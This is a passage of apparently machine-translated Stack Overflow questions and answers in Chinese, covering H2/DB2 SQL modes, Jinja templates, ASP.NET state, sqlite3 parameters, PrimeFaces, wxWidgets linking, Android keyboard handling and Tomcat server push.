    at org.h2.jdbc.JdbcConnection.prepareStatement(JdbcConnection.java:266)
    at org.springframework.jdbc.core.PreparedStatementCreatorFactory$PreparedStatementCreatorImpl.createPreparedStatement(PreparedStatementCreatorFactory.java:245)
    at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:581)
    ... 40 more 
```

编辑#2 如果有人在这里遇到同样的问题，这就是我发现的。我正在使用以下内容：

```
<jdbc:embedded-database id="dataSource" type="H2">
    <jdbc:script location="classpath:sql/create_schemas.sql"/>
    <jdbc:script location="classpath:sql/create_tables.sql"/>
    <jdbc:script location="classpath:sql/create_test_data.sql"/>
</jdbc:embedded-database> 
```

这意味着 Spring 将使用通用 bean 重新实例化数据源，因此我的设置丢失了。解决方案（在我的情况下）是通过以下方式简单地以编程方式加载数据库：

```
EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();
EmbeddedDatabase db = builder.setName("salgdb").setType(EmbeddedDatabaseType.H2)
            .addScript("sql/create_schemas.sql")
            .addScript("sql/create_tables.sql")
            .addScript("sql/create_test_data.sql")
                .build(); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T20:01:07.347

您可以做的是为 H2 数据库提供补丁，以支持“WITH UR”功能:-)

“FETCH FIRST 1 ROWS ONLY”已经适用于 H2 的最新版本，但仅适用于 DB2 模式。要启用 DB2 模式，请附加`;MODE=DB2`到数据库 URL，如下所示：

```
jdbc:h2:~/data/test;mode=db2 
```

例子：

```
create table customer(id int);
select * from customer fetch first 1 rows only; 
```

我已经用 H2 版本 1.3.166 对此进行了测试，但它也应该适用于旧版本，很可能是 1.3.161 和更新版本。在 Spring 之外对其进行测试：

*   [从http://h2database.com](http://h2database.com)下载 H2
*   运行 H2 控制台工具
*   使用数据库 URL：`jdbc:h2:~/temp/testdb;MODE=DB2`
*   运行语句：

    `create table ADVISOR(id int);`

    `SELECT * FROM ADVISOR FETCH FIRST 1 ROWS ONLY;`

如果我这样做，我不会得到例外。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-10T14:56:35.287

从版本 1.3.175 H2 也应该支持“WITH UR”。[H2 变更日志](http://www.h2database.com/html/changelog.html)

# python - 过滤循环中的循环变量

> ID：10246521
> 
> 赞同：3
> 
> 时间：2012-04-20T12:45:59.533
> 
> 标签：python, templates, jinja2

我想根据变量过滤`for loop`一个过滤器。这就是我正在做的事情：`groupby``loop`

```
{% for group in list_of_dicts | groupby('attribute') -%}
    {% if loop.index < 9 %}
    ...
    {% endif %}
{% endfor %} 
```

它按我的预期工作。在文档中有这样的语法：

```
{% for user in users if not user.hidden %}
    <li>{{ user.username|e }}</li>
{% endfor %} 
```

循环过滤器时如何使用上述语法？我的意思是像下面这样，它提出了一个`UndefinedError`：

```
{% for group in list_of_dicts | groupby('attribute') if loop.index < 9 -%}
    ...
{% endfor %}

UndefinedError: 'loop' is undefined. the filter section of a loop as well as the else block don't have access to the special 'loop' variable of the current loop.  Because there is no parent loop it's undefined.  Happened in loop on line 18 in 'page.html' 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:20:44.677

该过滤器的工作方式与普通 Python LC 中的一样（您可以访问`group`）。

在这种情况下使用过滤器无论如何都没有意义。例如，分组`list_of_dicts`包含比方说 3000 个元素，因此您正在进行 3000 次迭代，但您只需要 9 个。您应该对组进行切片：

```
{% for group in (list_of_dicts | groupby('attribute'))[:9] -%}
    ...
{% endfor %} 
```

（假设过滤器返回一个列表）

# c# - 为什么当我按下按钮时我的列表会重置？

> ID：10246525
> 
> 赞同：2
> 
> 时间：2012-04-20T12:46:05.737
> 
> 标签：c#, wcf, html-lists

我有一个页面，教师将学生的 id 插入文本框中，然后提交。然后它应该列出已添加的所有学生的列表。但是每次按下提交按钮时，列表都会被清除，只显示最后添加的学生。

```
public Service1Client ws = new Service1Client();
public string adress;
public List<ServiceReference1.User> lu;

protected void Page_Load(object sender, EventArgs e)
{
    if (lu==null)
        lu= new List<ServiceReference1.User>();
}

protected void Button1_Click(object sender, EventArgs e)
{
    ServiceReference1.User u= new ServiceReference1.User();
    u = ws.ShowUser(int.Parse(TextBox2.Text));

    if (!IsContained(u))
    {
        lu.Add(u);
        TextBox1.Text += u.FirstName;
    }
} 
```

有没有办法解决这个问题？或者我必须通过查询字符串将信息发送到页面吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:50:35.433

每个 HTTP 请求都会获得一个新的页面实例。
您应该将列表存储在 ViewState 中以跨请求保留。

# javascript - Firefox 中的 UI 对话框覆盖

> ID：10246528
> 
> 赞同：2
> 
> 时间：2012-04-20T12:46:28.497
> 
> 标签：javascript, jquery, jquery-ui, dialog, modal-dialog

我正在使用[jQuery UI 对话框模式](http://jqueryui.com/demos/dialog/#modal)在模式中显示表单。

在 Chrome 中测试时一切顺利。但在 Firefox 中，覆盖（ui-widget-overlay）不会占用整个浏览器窗口。因此，当我在模式处于活动状态时向下滚动时，覆盖停止并且网页的其余部分可见......

有什么帮助吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T12:53:28.247

尝试将其添加到覆盖 css

```
.ui-widget-overlay
{
    position:fixed;
    top:0;
    left:0;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-08T10:19:03.373

对我来说并不能解决问题。[相反，Firefox Mac 中的](https://stackoverflow.com/questions/3200000/jquery-ui-modal-dialog-stripe-issue "Firefox Mac 中的对话框 UI 背景问题")其他建议对话框 UI 背景问题似乎可以正常工作。

简而言之：

> *[...] jQuery UI 定义的背景不仅仅是纯色：它是一个图像 [...]*

所以你应该用类似的东西替换背景定义`background-color: #000;`。

请查看[提供的链接](https://stackoverflow.com/questions/3200000/jquery-ui-modal-dialog-stripe-issue "Firefox Mac 中的对话框 UI 背景问题")以获取更多详细信息

# gdb - gdb 在 armv7 上设置反汇编风格英特尔

> ID：10246530
> 
> 赞同：1
> 
> 时间：2012-04-20T12:46:32.400
> 
> 标签：gdb, arm

我在 armv7 平台上调试，我需要查看函数的 disass（在 C 中）。我正在使用 gdb 7.3，但没有 disass-flavor 选项。我怎么能看到 intel 风格的反汇编代码？

提前致谢。

# php - 用变量分解字符串

> ID：10246534
> 
> 赞同：1
> 
> 时间：2012-04-20T12:47:07.753
> 
> 标签：php, variables, explode

我正在尝试使用 php 操作图像的路径。该路径中有一个变量用户目录，所以我正在努力编写它。

我曾经这样做：

```
$texthtml = $content;
if (preg_match('/<img.+src=[\'"](?P<src>.+?)[\'"].*>/i', $texthtml, $image) ) {
$promopic = $image['src'];
} 
```

查找我的内容中是否有图像并从中创建变量。这行得通，但是出于页面加载的原因，我需要更改我的代码以从缩略图目录加载图像。

图像 src 如下所示：`"/uploads/userdirs/admin(variable)/image.jpg"`

但我希望它是这样的：

`"/uploads/userdirs/admin(variable)/mcith/mcith_image.jpg"`

向图像添加 /mcith/ 和 mcith_prefix。我正在考虑爆炸它，但我不知道如何使用可变路径来做到这一点。任何指针都非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:57:02.043

您可以通过多种不同的方式执行此操作，但我可能会为此使用[pathinfo()](http://us3.php.net/manual/en/function.pathinfo.php)：

```
$path = pathinfo($promopic);
$thumb = $path['dirname'] . '/mcith/mcith_' . $path['basename']; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:52:46.793

非常简单的版本，可以使用改进

```
preg_replace('/\/([a-zA-Z0-9]+\.[a-zA-Z0-9]{3,4})$/', '/mcith/mcith_$1', '/uploads/userdirs/admin(variable)/image.jpg'); 
```

# python - Tornado/Async Webserver 理论，如何处理更长的运行操作以利用异步服务器

> ID：10246539
> 
> 赞同：2
> 
> 时间：2012-04-20T12:47:29.257
> 
> 标签：python, asynchronous, tornado

我刚刚开始研究 Tornado 和异步 Web 服务器。在龙卷风的许多示例中，较长的请求由以下内容处理：

1.  调用 tornado 网络服务器
2.  tornado 对 api 进行异步网络调用
3.  在回调等待被调用时让龙卷风继续接受请求
4.  在回调中处理响应。服务器到用户。

因此，出于假设目的，假设用户正在向 tornado 服务器发出请求`/retrive`。`/retrieve`将向内部 api`myapi.com/retrieve_posts_for_user_id/`或 w/e 发出请求。api 请求在获取请求时可能需要一秒钟的时间来运行，然后当它最终返回 tornado 服务器时响应。 **首先，这种流动是使用龙卷风的“正常”方式吗？**网上的许多代码示例都建议这样做。

其次，（这是我开始感到困惑的地方）假设上述流程是标准流程，应该`myapi.com`是异步的吗？如果它不是异步的，并且每个请求可能需要几秒钟的时间，它不会造成与阻塞服务器相同的瓶颈吗？也许龙卷风或任何异步的正常用例示例将有助于阐明这个问题？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:55:17.723

是的，据我了解您的问题，这是 Tornado 的正常用例。

如果对 Tornado 服务器的所有请求都会向 发出请求`myapi.com`并且`myapi.com`正在阻塞，那么是的，`myapi.com`仍然是瓶颈。但是，如果只有一些请求必须由 处理`myapi.com`，那么 Tornado 仍然是一个胜利，因为它可以在等待对请求的响应的同时继续处理这些请求`myapi.com`。但无论如何，如果`myapi.com`无法处理负载，那么将 Tornado 服务器放在它前面不会神奇地解决这个问题。`myapi.com`不同之处在于您的 Tornado 服务器即使在忙碌时仍然能够响应请求。

# python - Python sqlite3 使用命名和 qmark 参数执行

> ID：10246542
> 
> 赞同：2
> 
> 时间：2012-04-20T12:47:40.463
> 
> 标签：python, sqlite

我想执行这样的 SQL 语句：

```
SELECT * FROM table WHERE spam LIKE ? AND eggs LIKE :eggs 
```

Python sqlite3 模块文档说：

> Cursor.execute(sql[, 参数])
> 
> [...]
> 
> sqlite3 模块支持两种占位符：问号（qmark 样式）和命名占位符（命名样式）。

但是有没有办法同时使用 qmark 样式和命名样式？

解决方案（感谢 jadkik94）：

```
params = ["a","b","c"]
kparams = {'d':"d", 'e':"e"}
sql = "SELECT * FROM table WHERE (a LIKE ? OR b LIKE ? OR c LIKE ?) AND (d LIKE :d AND e LIKE :e)"
sql = sql.replace("?", ":{}").format(*range(sql.count("?")))
# >>> sql
# "SELECT * FROM table WHERE (a like :0 OR b like :1 OR c like :2) AND (d like :d AND e like :e)"
kparams.update(dict(map(lambda x: (str(x[0]), x[1]), enumerate(params))))
# >>> kparams
# {'0': 'a', '1': 'b', '2': 'c', 'd': 'd', 'e': 'e'}
c.execute(sql, kparams) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T13:55:48.883

如果这是您的代码：

```
known = {'d': 'dval', 'e': 'eval'}
unknown = ['a', 'b', 'c']
# instead of
"SELECT * FROM table WHERE (a like ? OR b like ? OR c like ?) AND (d like :d AND e like :e)"
known.update(dict((str(i), v) for i, v in enumerate(unknown)))
# and use
"SELECT * FROM table WHERE (a like :1 OR b like :2 OR c like :3) AND (d like :d AND e like :e)" 
```

我想你不能同时使用这两种方式，但这是一种选择。

# c# - 为多个帐户设置 Outlook 签名

> ID：10246547
> 
> 赞同：1
> 
> 时间：2012-04-20T12:48:06.130
> 
> 标签：c#, outlook

我正在编写一个应用程序，该应用程序根据每个 Microsoft Outlook 帐户的预获取数据设置签名（用户可能有多个 Outlook 帐户用于各种目的）。

我可以为默认帐户设置签名，但我还没有找到如何为每个 Outlook 帐户单独设置签名。我做了很多自己的研究，并在 Microsoft.Office.Interop 对象周围闲逛，但运气不佳。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T13:10:44.903

要以编程方式选择 Outlook 配置文件，您只需使用

```
Microsoft.Office.Interop.Outlook.Application App =
    new Microsoft.Office.Interop.Outlook.Application();
NameSpace mapi = App.GetNamespace("MAPI");
mapi.Logon(profileName); 
```

显然，`profileName`在启动 Outlook 时将其设置为下拉列表中显示的内容（如果您未在控制面板电子邮件设置中设置默认配置文件）。

然而，这在许多方面都是有问题的，因为 Outlook 不支持多个会话，即使 MAPI 登录支持：http: [//msdn.microsoft.com/en-us/library/bb219914 (v=office.12).aspx](http://msdn.microsoft.com/en-us/library/bb219914(v=office.12).aspx)

含义：如果 Outlook 已经在运行，您甚至可以设置`NewSession`为`true`，但这无济于事。无论您设置什么名称，它都会为您提供当前登录的配置文件。如果你有一个 Outlook 僵尸（我在测试时得到了这个，请检查任务管理器），即没有显示 UI 的 Outlook，问题是一样的。

如果您可以确保 Outlook 在处理签名时不会运行，那么您应该没问题。

# java - primefaces p：组件形式外的消息

> ID：10246548
> 
> 赞同：3
> 
> 时间：2012-04-20T12:48:12.510
> 
> 标签：java, jsf, primefaces, facelets

我正在使用 JSF 2.0 和 Primefaces 3.2。

我正在使用 Facelets 进行模板化，并且构建了一个 3 列布局：

左栏 - mainContent 栏 - 右栏。每列都有自己的模板 xhtml 文件，其中包含我在 mainTemplate 中插入的 ui:composition。

在 mainContent 列中，我有一个信息按钮（p:commandButton）：

```
<h:form id="mainForm">
<p:commandButton id="infoButton" value="Info" actionListener="#{faceletsAttachment.addInfo}"/> 
</h:form> 
```

但我希望信息显示在右栏中，并带有

```
<h:form id="rightColumnForm">
<p:message for="infoButton">
</h:form> 
```

这显然是行不通的，因为没有找到infoButton。知道我怎样才能完成这项工作吗？我试过了

```
<p:message for="mainForm:infoButton"> 
```

也是，但没有雪茄。

我想使用 ap:message 的原因是我希望消息将自己定位在 infoButton 的 y 位置上。如果您有替代解决方案来解决我如何做到这一点，我也将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T13:06:10.470

如果您从服务器端手动添加消息，您可以执行以下操作

`<p:message id="myInfoButton" for="myInfoButton" />`

并从服务器发送消息`myInfoButton`像这样

```
FacesContext.getCurrentInstance.addMessage("myInfoButton ", new FacesMessage("My Message", "Some Text goes here...")); 
```

还要添加`:rightColumnForm`id 来更新`<p:commandButton id="infoButton"`

# api - Google calendar api v3 - 未定义的构造函数错误

> ID：10246549
> 
> 赞同：1
> 
> 时间：2012-04-20T12:48:18.673
> 
> 标签：api, calendar, google-calendar-api

我有一个日历 API 的访问令牌，无法弄清楚如何使用这个令牌来操作日历。

我已经阅读了他们的文档和入门指南，但仍然需要帮助。我使用以下代码创建日历服务：

```
Calendar service = new Calendar(httpTransport, accessProtectedResource, jsonFactory);
service.setApplicationName("YOUR_APPLICATION_NAME"); 
```

但它说：

> 构造函数 Calendar(HttpTransport, GoogleAccessProtectedResource, JacksonFactory) 未定义。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T07:41:48.727

更改构造函数，如下所示：

```
Calendar service = new Calendar(httpTransport, 
                                jsonFactory, 
                                accessProtectedResource); 
```

# session - 持续交付的会话存活率

> ID：10246550
> 
> 赞同：0
> 
> 时间：2012-04-20T12:48:18.503
> 
> 标签：session, heroku, continuous-delivery

我正在使用 jsf 中的应用程序并不断交付给 Heroku。我是 JSF 和 Heroku 的新手。我不知道这是否可能，但我希望能够对应用程序进行小的更新，部署到 Heroku 但仍然让会话在会话范围的管理 bean 中存活。我在 web.xml 中将状态保存设置为客户端，但是当我将应用程序部署到 Heroku 时，管理 bean 中的所有值都将重置为其初始值。有谁知道如何解决这一问题？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T10:50:53.257

在 Heroku 上，您需要外部化您的会话状态（或者最好不要使用会话状态，遗憾的是 JSF 不支持该选项）。配置您的应用服务器来执行此操作通常很容易，但这取决于您使用的应用服务器。以下是使用 Jetty 和 MongoDB 作为会话存储的方法：
[http ://www.jamesward.com/2011/11/30/using-mongodb-for-a-java-web-apps-httpsession](http://www.jamesward.com/2011/11/30/using-mongodb-for-a-java-web-apps-httpsession)

# c++ - C++ 重载 >> 和 << 运算符

> ID：10246556
> 
> 赞同：-1
> 
> 时间：2012-04-20T12:48:36.823
> 
> 标签：c++, operators

我一直在尝试重载C++ 中的`>>`and运算符，并且不断得到：`<<`

```
Error    2    error LNK2019: unresolved external symbol "class std::basic_istream<char,struct std::char_traits<char> > & __cdecl operator>>(class std::basic_istream<char,struct std::char_traits<char> > &,class ArrayStorage &)" (??5@YAAAV?$basic_istream@DU?$char_traits@D@std@@@std@@AAV01@AAVArrayStorage@@@Z) referenced in function _main    G:\Desktop\ACW\08227_ACW2_TestHarnessSolution\main.obj 
```

我这样做的方式是：

```
//.h file
friend ostream& operator<<(ostream &sout, ArrayStorage &Astor);
friend istream& operator>>(istream &sin, ArrayStorage &Astor);

//cpp file
ofstream& operator<< (ofstream &sout, ArrayStorage &astor)
{
    astor.write(sout);
    return sout;
}

ifstream& operator>> (ifstream &sin, ArrayStorage &astor)
{
    astor.read(sin);
    return sin;
} 
```

我的一个朋友告诉我从头文件中的声明中删除“朋友”并将其移到类外，但我仍然遇到同样的错误。这可能很容易，但我无法弄清楚什么不起作用。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T12:51:25.600

您的声明具有参数和返回类型`istream`and `ostream`; 但定义有`ifstream`和`ofstream`。

从定义中删除`f`s ，一切都应该没问题。

声明本身很好（`friend`假设它们在类定义中）；他们在周围的命名空间中声明函数。但是，如果`read`和`write`是公开的，那么您可能会考虑取消他们的好友关系，因为在这种情况下他们不需要特权访问。

# jdbc - WSO2 Identity Server v3.2.3 的外部 JDBC 用户存储

> ID：10246558
> 
> 赞同：0
> 
> 时间：2012-04-20T12:48:38.377
> 
> 标签：jdbc, wso2, wso2is

我想将一个外部 JDBC 用户存储添加到 WSO2 Identity Server v3.2.3 WSO2 文档（http://docs.wso2.org/display/identity/Configuring+an+External+JDBC+User+Store）没有指定这个为自定义用户模式完成。旧版本的 Identity Server 在管理控制台中支持“添加外部用户存储”（或类似的），可以在其中为用户数据查询指定 SQL 语句。但是，v3.2.3 在 UI 中不再有这个。

那么，自定义用户模式是否可能，或者 Identity Server 是否需要固定用户模式？

BR，哈里

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-26T06:54:43.093

如果您的自定义模式与我们默认的模式有很大不同（请参阅 user-mgt.xml 中注释掉的部分），那么您需要扩展 JDBCUserStoreManager 并覆盖其中的一些方法以满足您的要求。

# php - 获取标头响应正文

> ID：10246562
> 
> 赞同：0
> 
> 时间：2012-04-20T12:48:56.370
> 
> 标签：php, html, image, header, firebug

我正在使用 php 开发一个 twitter 搜索 api，它能够搜索 twitter，并从推文中保存发布的图像。这一切都很好，但是对于 facebook，不是在网页中加载图像，而是在响应之后加载。使用 firebug，转到 Net 标签，我可以在 getphoto() 的响应选项卡下看到我需要的 html 源代码。我希望从这个 html 文本中获取一个 img src，但 Facebook 似乎加载了基本结构，然后重新加载了带有图像的页面。

我的问题是：我怎样才能得到这个“响应体”？

我以前使用过 get_headers() ，但我认为它在这种情况下不起作用，我已经在网上搜寻了这个问题的答案，但没有出现。

任何帮助将不胜感激，谢谢。不要认为我的代码有助于解释，但愿意提出一些

编辑：

脸书网址示例：/https://www.facebook.com/photo.php?pid=1258064&l=acb54aab14&id=110298935669685

这会将您带到包含图像的页面

这是图像标签：

img class="fbPhotoImage img" id="fbPhotoImage" src="https://fbcdn-sphotos-a.akamaihd.net/hphotos-ak-ash3/522357_398602740172635_110298935669685_1258064_1425533517_n.jpg" alt=""

但这在响应通过之前不会出现。

由于 twitter 对它们的喜爱，我有一个 get_header 函数来扩展缩短的 URL，这可以从具有多个缩短/重定向的其他 3rd 方照片网站获取和图像。

以前没有使用过 cURL，这是最好/唯一的方法吗？

再次感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:55:04.500

> 而不是图像与网页一起加载，而是在响应之后加载

我不知道这是什么意思。

我只能猜测您尝试从中获取 html 的 URL（您的代码应该解析该 URL 以提取图像 URL）实际上正在发出重定向。

使用 curl 进行传输并告诉它遵循重定向 - 注意这仅适用于标头重定向 - 不适用于元等效重定向、元刷新重定向或 javascript 位置重定向。

（也许 Faceboo0k 不想让你窃取他们的内容？）

# c++ - WxWidgets 应用程序运行失败

> ID：10246564
> 
> 赞同：1
> 
> 时间：2012-04-20T12:49:04.063
> 
> 标签：c++, multithreading, wxwidgets

几个小时后，我终于能够编译 wxwidgets-2.8.12 库，如下所示：-

我将 .zip 解压缩到文件夹 D:\wxwidgets2812\wxwidgets-2.8.12

我进入 D:\MinGW\MSYS\1.0 运行批处理文件并执行以下操作：-

去了以下路径：-

```
 cd /d/{WXWIN}/build/msw 
```

并以下列方式编译库： -

```
 mingw32-make -f makefile.gcc MONOLITHIC=0 SHARED=1 UNICODE=0 BUILD=release 
```

它构建/编译成功然后我在项目属性中添加->包含目录->D:\wxwidgets2812\wxwidgets-2.8.12\include,addidtional options-> `wx-config --cxxflags`,在链接器中我添加到库中->`wx-config --libs`

```
 Now when i run my code / project ,it gives me following errors:-

 The application failed with exit code -1073741515 (0xc0000135). 
 This could indicate that no required .dll was found in the PATH. 
 Please try to start the following command from the command shell (cmd.exe). 
 This may give some additional information. 

 C:\Users\Lenovo\Documents\NetBeansProjects\CppApplication_6\dist\Debug\MinGW_1-    
 Windows\cppapplication_6 

 RUN FAILED (exit value -1,073,741,515, total time: 22ms) 
```

请帮我运行应用程序。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:54:38.350

“这可能表明在 PATH 中找不到所需的 .dll”

这表明您已经构建了应用程序以链接到包含 wxWidgets 库的 DLL。

你可以从这里走两条路：

1.  更改您的应用程序构建以静态链接到库。如果您还没有这样做，您还必须构建 wxWidgets 以生成静态库。

2.  将 wxWidgets DLL 复制到您的路径中。（或者将 DLL 文件夹添加到您的路径中作为快速修复以帮助您入门。）

选项 #2 现在可能更简单，因为您似乎已经构建了 wxWidgets 的 DLL 版本。因此，您需要找到在构建 wxWidgets 时创建的 wxWidgets DLL 并将其移动到您的路径中。

# javascript - 使用 Eclipse IDE 配置 Google 闭包工具

> ID：10246565
> 
> 赞同：1
> 
> 时间：2012-04-20T12:49:08.013
> 
> 标签：javascript, eclipse, closures

有谁知道如何将 Google Closure 工具与“Eclipse IDE for Javascript Web Developers”集成？
提前致谢..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-13T17:52:53.757

试试这些 Eclipse 插件：

用于闭包模板的 Eclipse 插件

带有闭包编译器和闭包库的 JavaScript Eclipse 插件

[http://www.normalesup.org/~simonet/soft/index.en.html](http://www.normalesup.org/~simonet/soft/index.en.html)

一切正常！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-17T08:37:15.390

自己没试过，但希望这篇文章有帮助

[https://stackoverflow.com/questions/3287771/integrate-google-closure-compiler-with-eclipse-ide# *=*](https://stackoverflow.com/questions/3287771/integrate-google-closure-compiler-with-eclipse-ide#_=_)

# android - 如何在使用 emailIntent 发送电子邮件后自动隐藏键盘

> ID：10246569
> 
> 赞同：4
> 
> 时间：2012-04-20T12:49:25.080
> 
> 标签：android, android-intent, keyboard, message

有一个页面，用户可以在需要时发送电子邮件、短信或致电其客人。问题是当用户向其客人发送电子邮件时，键盘并没有隐藏。即使我在解决这个问题时遇到了一个小问题，但似乎仍然很难找到类似的帖子来解决它。我还将制作屏幕截图并将它们放在这里。

![在此处输入图像描述](../Images/438831c5c128fafc9d358fe703e98c14.png) ![在此处输入图像描述](../Images/64c867ddc54859cfc6e379c693641f09.png) ![在此处输入图像描述](../Images/200fb449902b73f3a5b7fa0567662113.png) ![在此处输入图像描述](../Images/20f35eb9434e949d7caecad9074a2ded.png)

如您所见，发送邮件后键盘并没有隐藏。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2015-04-22T08:12:33.100

```
Intent sendIntent = new Intent(Intent.ACTION_SEND);
                            sendIntent.setType("text/plain");
                            sendIntent.putExtra(Intent.EXTRA_EMAIL,
                                    new String[] { **EmailAddress** });
                            startActivityForResult(sendIntent, 1);

   @Override
    protected void onActivityResult(int arg0, int arg1, Intent arg2) {
        super.onActivityResult(arg0, arg1, arg2);
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                InputMethodManager inputManager = (InputMethodManager) activity
                        .getSystemService(Context.INPUT_METHOD_SERVICE);
                inputManager.hideSoftInputFromWindow(**AnyViewOfScreen**.getWindowToken(),
                        InputMethodManager.HIDE_NOT_ALWAYS);
            }
        }, 300);
    } 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-26T15:25:55.953

只需在清单中为所需活动添加以下代码即可：

```
android:windowSoftInputMode="stateAlwaysHidden"
android:configChanges="keyboardHidden" 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-20T12:54:13.863

当键盘显示和隐藏自身时，它不是覆盖，但这是我用来根据需要隐藏和显示键盘的两种方法。

```
 public void hideKeyboard(final View aView){
                 aView.post(new Runnable() {
                    @Override
                    public void run(){

                    InputMethodManager inputManager = (InputMethodManager) this.getSystemService(Context.INPUT_METHOD_SERVICE); 
                    inputManager.hideSoftInputFromWindow(this.getCurrentFocus().getWindowToken(), InputMethodManager.HIDE_NOT_ALWAYS);
                     }
                 }
    }
    public void showKeyboard(final View aView) {
        aView.post(new Runnable() {
            @Override
            public void run() {

                InputMethodManager inputMethodManager=(InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
                inputMethodManager.toggleSoftInputFromWindow(ListingScreen.this.getCurrentFocus().getWindowToken(), InputMethodManager.SHOW_FORCED, 0);
            }
        });
    } 
```

当您调用隐藏/显示键盘时，传入您的当前视图。后可运行线程将等待运行，直到视图完成加载，然后关闭键盘。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-06-09T07:03:38.207

希望这可以帮助某人：

```
@Override
protected void onResume() {
    super.onResume();
    Log.d("OnResume", "Called");
    new Handler().postDelayed(new Runnable() {
        @Override
        public void run() {
            InputMethodManager inputManager = (InputMethodManager) LocationDetailActivity.this
                    .getSystemService(Context.INPUT_METHOD_SERVICE);
            inputManager.hideSoftInputFromWindow(getCurrentFocus().getWindowToken(),
                    InputMethodManager.HIDE_NOT_ALWAYS);
        }
    }, 300);

} 
```

如果您的布局中没有任何可聚焦的视图，只需将虚拟线性布局添加到您的 xml

```
<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:focusable="true"
    android:focusableInTouchMode="true">

    <requestFocus />
</LinearLayout> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-20T13:01:31.140

在您想要隐藏键盘的地方调用此方法（例如，当您单击发送电子邮件按钮时调用此方法）

```
protected void showVirturalKeyboard()
{

    Timer timer = new Timer();
    timer.schedule(new TimerTask()
    {
        @Override
        public void run()
        {
            InputMethodManager m = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE);
            if(m != null)
            {
                m.toggleSoftInput(0, InputMethodManager.HIDE_IMPLICIT_ONLY);
            }
        }
    }, 100);
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-08-04T10:32:08.130

在尝试了我在 StackOverflow 上找到的所有解决方案后，似乎没有任何效果。最后我确实找到了一种强制关闭键盘的方法，但并不理想。

您可以在 Android Manifest 中为该活动设置 android:windowSoftInputMode="adjustPan"。

这里解释了这个不幸的副作用[http://developer.android.com/guide/topics/manifest/activity-element.html#wsoft](http://developer.android.com/guide/topics/manifest/activity-element.html#wsoft)：

“活动的主窗口没有调整大小来为软键盘腾出空间。相反，窗口的内容会自动平移，这样当前的焦点就不会被键盘遮挡，用户总是可以看到他们正在输入的内容。这通常是不如调整大小可取，因为用户可能需要关闭软键盘才能到达窗口的模糊部分并与之交互。”

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-07-26T09:51:49.497

我有类似的问题。Gmail 发送后会隐藏键盘。当您返回应用程序时，它会专注于其他事情。如果您使用较慢的设备，您会看到 gmail 在发送消息后隐藏了键盘。

# java - 使用Java从服务器向客户端发送消息

> ID：10246570
> 
> 赞同：0
> 
> 时间：2012-04-20T12:49:28.153
> 
> 标签：java, linux, messaging, server-side

我正在使用*Apache Tomcat 7*（*JSP*和*Servlets*）。在我的应用程序中，我需要从服务器向客户端发送一些消息。贝娄，我会稍微解释一下我在做什么。

**简要说明：**如果用户每次想连接互联网时都没有登录，应用程序会弹出一个*登录页面。*在用户成功登录并且他的时间即将结束后，我需要向客户端发送一条剩余时间的消息（例如最后几分钟）。在特定时间打开广告弹出窗口也可能是另一个要求。

我现在大约，`JMS`但我不知道这对我的场景有多合适。我还在其他帖子中阅读过，[WebSocket](http://en.wikipedia.org/wiki/WebSockets)也是一种选择。

我在 CentOS 6.2 上运行服务器。

**问：**对于这个场景，你有没有一些想法，如何用*Java*技术来处理它？如果您还有其他想法，请随时公开！

NB 与*JavaScript*和*PHP*相关我在 SO 的问题上找到了很好的答案。我对如何使用*Java*技术解决这个问题特别感兴趣。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:53:15.643

[http://jwebsocket.org/](http://jwebsocket.org/) 也许这符合您的需要。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T12:55:52.523

您将无法启动从服务器到客户端的 HTTP 连接。一种解决方案是使用 WebSocket/Comet 框架。不幸的是，websockets 目前并没有真正广泛传播（服务器+浏览器）。我会建议你使用一个框架来填补“空白”： [https ://github.com/Atmosphere/atmosphere](https://github.com/Atmosphere/atmosphere)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T13:18:33.990

我不明白您对我们用 Java 实现解决方案的痴迷——任何有效的解决方案都应该可以跨不同的服务器端语言移植。但是，如果终止是在没有同步用户驱动交互的情况下发生的，那么您只是通过尝试在此处处理它来在服务器上创建负载。如果您希望有人为您编写代码，那么这不是正确的论坛。

> 我现在关于 JMS....CentOS 6.2。

这里没有太多帮助。

我们真正需要知道的是你的意思是：

> 用户登录成功后，他的时间即将结束

（我假设您的意思是会话时间即将结束，除非您编写了一些预测人们何时死亡的软件）。

您如何确定会话何时结束？

